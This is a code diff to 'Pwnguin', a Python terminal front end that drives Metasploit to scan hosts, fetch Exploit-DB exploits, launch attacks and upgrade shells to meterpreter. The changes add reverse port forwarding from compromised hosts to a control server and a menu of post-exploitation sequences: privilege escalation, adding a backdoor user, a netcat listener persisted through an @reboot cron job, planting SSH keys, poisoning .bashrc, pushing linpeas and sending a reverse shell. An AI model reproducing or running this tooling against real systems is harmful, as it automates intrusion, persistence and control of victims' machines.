@@ -4,9 +4,10 @@ from time import sleep
 from pathlib import Path
 import ipaddress
 
-import autopwn as autopwn
+import autopwn
+import sequences
 import post.postexploit as postexploit
-import computer as computer
+import computer
 from computer import Computer
 from pymetasploit3.msfrpc import (
     MsfRpcClient,
@@ -34,6 +35,8 @@ from textual.widgets import (
     Collapsible,
     TextArea,
     Markdown,
+    RadioSet,
+    RadioButton,
 )
 from textual.widgets.tree import TreeNode
 from textual import work, on, log
@@ -55,7 +58,8 @@ STATE = {
     "payload_ms": None,  # Metasploit payload object
     "sessions": {},  # dict of shell sessions
     "computers": {},
-    "networks": {},
+    "ctrlservport": 0,
+    "ctrlservproc": None,
 }
 
 RANK_COLORS = {
@@ -142,23 +146,23 @@ class Tile2(Static):
             # assure that the IP is a network ip
             command = str(ipaddress.ip_network(command, strict=False))
             self.perform_network_scan(command)
-        STATE["IP"] = command
         input.placeholder = "let's go !"
         pretty = self.parent.query_one("#logs", Pretty)
         pretty.update("Scanning " + command)
 
     @work(exclusive=True, thread=True)
     def perform_computer_scan(self, ip: str) -> None:
-        result = autopwn.scanIp4Vulnerabilities(ip=ip.split("/")[0])
-        if "0 hosts up" in Path("./run/detect.xml").read_text():
+        try:
+            result = autopwn.scanIp4Vulnerabilities(ip=ip.split("/")[0])
+        except:
             self.app.call_from_thread(
                 self.parent.query_one("#logs", Pretty).update, "The host doesn't exist"
             )
             return
-        else:
-            if ip not in STATE["computers"]:
-                STATE["computers"][ip] = Computer()
-            self.app.call_from_thread(self.parent.query_one(Tile4).rebuild_tree)
+
+        if ip not in STATE["computers"]:
+            STATE["computers"][ip] = Computer()
+        self.app.call_from_thread(self.parent.query_one(Tile4).rebuild_tree)
 
         autopwn.getEdbExploit(result, get_all=True)
         self.app.call_from_thread(self.parent.query_one("#logs", Pretty).update, result)
@@ -217,7 +221,6 @@ class Tile4(Static):
 
     @on(Tree.NodeSelected)
     def on_tree_selected(self, event: Tree.NodeSelected) -> None:
-        self.app.query_one(TabbedContent).active = "computer_tab"
         node = event.node
         # check if network or computer
         if "/" in str(node.label):
@@ -239,9 +242,10 @@ class Tile4(Static):
             node.set_label("*" + str(node.label))
             self.connected = node
         self.app.query_one(ComputerInfos).scan(ip)
-        self.app.query_one(VulnChoice).build_vuln_list(
-            STATE["computers"][ip].vulnerabilities
-        )
+        if ip:
+            self.app.query_one(VulnChoice).build_vuln_list(
+                STATE["computers"][ip].vulnerabilities
+            )
         STATE["IP"] = ip
 
 
@@ -260,30 +264,34 @@ class ComputerInfos(Static):
     @work(exclusive=True, thread=True)
     def scan(self, IP: str | None = None):
         shell_id = None
-        computer = Computer()
-        if not IP or STATE["computers"].get(IP, Computer()).is_local:
+        computer: Computer = STATE["computers"].get(IP, Computer())
+        if not IP or computer.is_local:
             # infos machine locale
             computer.os = postexploit.getOS()
+            computer.networks = []
             for inter in postexploit.getTargetConnections():
                 computer.add_network(inter[0], inter[1])
+            computer.arp = []
             for entry in postexploit.getKnownARP():
                 computer.add_arp_entry(entry["ip"], entry["mac"], entry["iface"])
         else:
             ip_no_mask = IP.split("/")[0]
             # récupérer la session de la machine distante si elle existe
-            for id, session in STATE["client"].sessions.list.items():
-                if ip_no_mask in session["tunnel_peer"]:
-                    shell_id = id
+            shell_id = (
+                autopwn.findShellID(STATE["client"], ip_no_mask)
+                if STATE["client"]
+                else None
+            )
             if shell_id:
+                # update the results from the save
                 shell = autopwn.getShell(STATE["client"], shell_id)
                 computer.os = postexploit.getOS(shell=shell)
+                computer.networks = []
                 for inter in postexploit.getTargetConnections(shell=shell):
                     computer.add_network(inter[0], inter[1])
+                computer.arp = []
                 for entry in postexploit.getKnownARP(shell=shell):
                     computer.add_arp_entry(entry["ip"], entry["mac"], entry["iface"])
-            else:
-                # Récupérer depuis la backup
-                computer = STATE["computers"].get(IP, computer)
         s = ""
         if shell_id:
             s += "connected: yes\n"
@@ -410,6 +418,11 @@ class ParamMenu(Static):
 
     @on(Button.Pressed)
     def pre_launch_attack(self, event: Button.Pressed) -> None:
+        if not STATE["IP"]:
+            self.app.query_one("#logs", Pretty).update(
+                "You need to select an interface from where you want to start the attack !"
+            )
+            return
         for list_item in self.query_one(ListView).children:
             param_name = str(list_item.query_one(Label).renderable)
             param_value = list_item.query_one(Input).value
@@ -418,10 +431,11 @@ class ParamMenu(Static):
             else:
                 STATE["payload_ms"][param_name] = param_value
         self.app.query_one("#logs", Pretty).update("Okayy let's goo !")
-        self.launch_attack()
+        self.launch_attack(STATE["IP"])
 
     @work(exclusive=True, thread=True)
-    def launch_attack(self):
+    # TODO set infected via "ip_source attack/mask:port" (exemple: "192.168.55.41/24:55555") + autoroute + port forwarding for ctrl serv
+    def launch_attack(self, ip_source_attack: str):
         client: MsfRpcClient = STATE["client"]
         exploit = STATE["exploit_ms"]
         payload = STATE["payload_ms"]
@@ -429,20 +443,31 @@ class ParamMenu(Static):
         while len(client.jobs.list) != 0:
             pass
         new_sessions = client.sessions.list
-        self.app.call_from_thread(
-            self.app.query_one("#logs", Pretty).update,
-            str(new_sessions) + " Upgrading shell to meterpreter...",
-        )
         new_sess_id = [
             element for element in new_sessions if element not in STATE["sessions"]
         ][0]
-        STATE["sessions"] = new_sessions
+        # upgrading session to meterpreter
         if new_sessions[new_sess_id]["type"] == "shell":
+            self.app.call_from_thread(
+                self.app.query_one("#logs", Pretty).update,
+                str(new_sessions) + " Upgrading shell to meterpreter...",
+            )
             shell = client.sessions.session(new_sess_id)
             shell.upgrade(lhost="0.0.0.0", lport="5678")
             shell.stop()
             new_sessions = client.sessions.list
 
+        # port forwarding
+        # rerun because shell upgrade generate new shell
+        new_sess_id = [
+            element for element in new_sessions if element not in STATE["sessions"]
+        ][0]
+        shell = client.sessions.session(new_sess_id)
+        shell.write(
+            f"portfwd add -R -l {STATE['ctrlservport']} -L {ip_source_attack.split('/')[0]} -p {STATE['ctrlservport']}"
+        )
+
+        STATE["sessions"] = new_sessions
         self.app.call_from_thread(
             self.app.query_one(ShellMenu).update_shells, new_sessions
         )
@@ -580,6 +605,53 @@ class ShellMenu(Static):
             sleep(0.1)
 
 
+class SequencesMenu(Static):
+
+    sequences = [
+        "user to root (no passwd)",
+        "add user 'pwnguin'(already root)",
+        "add nc listener port 55555 @reboot cron",
+        "add authorized ssh key for user",
+        "transmit linpeas",
+        "transfer main.zip ?",
+        "bashrc pwnguined",
+        "send revshell",
+        "download precompiled nmap",
+    ]
+
+    def compose(self) -> ComposeResult:
+        with RadioSet(id="sequences"):
+            for seq in self.sequences:
+                yield RadioButton(seq)
+        yield Button("Launch !")
+
+    @on(Button.Pressed)
+    @work(exclusive=True, thread=True)
+    def launch_sequence(self, event: Button.Pressed):
+        idx = self.query_one(RadioSet).pressed_index
+        if idx == -1:
+            return
+        ip = STATE["IP"]
+        ip_no_mask = ip.split("/")[0]
+        shell_id = autopwn.findShellID(STATE["client"], ip_no_mask)
+        if not shell_id:
+            self.app.call_from_thread(
+                self.app.query_one("#logs", Pretty).update,
+                "no shell available for this IP",
+            )
+            return
+        shell = autopwn.getShell(STATE["client"], shell_id)
+        srv = ip_no_mask
+        shell.write("shell")
+        sleep(1)
+        autopwn.sendCommands(
+            shell, sequences.getsequence(idx, srv + ":" + str(STATE["ctrlservport"]))
+        )
+        sleep(1)
+        shell.write(">")
+        sleep(1)
+
+
 class Tile5(Static):
     def compose(self) -> ComposeResult:
         with TabbedContent():
@@ -595,6 +667,8 @@ class Tile5(Static):
                 yield ParamMenu()
             with TabPane("Shells", id="shell_tab"):
                 yield ShellMenu()
+            with TabPane("Sequences", id="sequence_tab"):
+                yield SequencesMenu()
             with TabPane("File", id="file_tab"):
                 yield Label(
                     "This tab is opened when automatic exploitation is not possible",
@@ -644,6 +718,11 @@ class Pwnguin(App):
         # start metasploit
         client = autopwn.runMetasploit(reinit=True, show=False, wait=False)
         STATE["client"] = client
+        # Open Control Server
+        STATE["ctrlservproc"], STATE["ctrlservport"] = postexploit.openCtrlSrv(
+            show=False
+        )
+
         self.app.call_from_thread(self.end_init)
 
     def end_init(self):
@@ -655,3 +734,4 @@ if __name__ == "__main__":
     app.run()
     computer.save(STATE["computers"])
     subprocess.run("kill $(ps aux | grep 'msfrpcd' | awk '{print $2}')", shell=True)
+    STATE["ctrlservproc"].kill()
